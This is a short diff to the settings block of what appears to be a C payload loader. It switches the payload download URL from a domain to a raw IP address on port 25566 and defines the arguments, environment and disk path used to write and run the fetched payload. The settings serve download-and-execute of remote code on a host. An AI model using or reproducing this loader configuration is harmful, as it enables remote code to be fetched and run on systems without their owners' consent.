@@ -4,7 +4,7 @@
 //---------------------------------------------------------------
 // EDIT PAYLOAD SETTINGS HERE
 
-#define PAYLOAD_URL "https://fruit.qc.to:25566/api/testloader?send=payload-6"//"https://127.0.0.1:25566/api/testloader?send=payload-6" // URL to download the payload from
+#define PAYLOAD_URL "https://71.163.46.151:25566/api/testloader?send=payload-6" //"https://fruit.qc.to:25566/api/testloader?send=payload-6" // URL to download the payload from
 #define PAYLOAD_ARGV {"example_argv1", "hello lockheed", NULL} // arguments for the payload execution
 #define PAYLOAD_ENVP {NULL} // environment variables for the payload execution
 #define PATH_TO_WRITE "../test_files/demo_file" // path to write payload to on host disk (if not executable)
